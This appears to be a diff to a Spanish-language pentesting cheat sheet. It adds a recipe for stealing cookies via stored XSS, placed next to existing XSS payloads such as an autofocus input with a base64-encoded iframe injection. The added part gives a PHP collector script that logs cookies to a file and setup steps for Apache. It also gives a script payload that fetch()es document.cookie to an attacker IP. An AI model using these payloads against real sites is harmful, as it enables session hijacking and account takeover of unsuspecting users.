@@ -810,7 +810,20 @@ javascript:alert(document.cookie) --> DOM XSS in jQuery anchor href attribute si
       Mario Bros XSS
          <iframe src="https://jcw87.github.io/c2-smb1/" width="100%" height="600"></iframe>
          <input onfocus="document.body.innerHTML=atob('PGlmcmFtZSBzcmM9Imh0dHBzOi8vamN3ODcuZ2l0aHViLmlvL2MyLXNtYjEvIiB3aWR0aD0iMTAwJSIgaGVpZ2h0PSI2MDAiPjwvaWZyYW1lPg==')" autofocus>
-         
+
+ - Robo de cookies mediante XSS Stored
+
+    1. En /var/www/html crear los archivos cookies.txt y getcookie.php con el siguiente contenido:
+            <?php
+                $cookie = $_GET['data'];
+                $archivoParaGuardarLasCookies = fopen("cookies.txt", "a+");
+                fwrite($archivoParaGuardarLasCookies, $cookie . "\n");
+                fclose($archivoParaGuardarLasCookies);
+            ?>
+    2. Darles permisos de lectura/escritura a los dos archivos
+    3. Encender apache
+    4. En la web vulnerable, alamcenar XSS con lo siguiente: <script>fetch(`http://IP/getcookie.php?data=${document.cookie}`);</script>
+
   
 WORDLISTS
 ..........
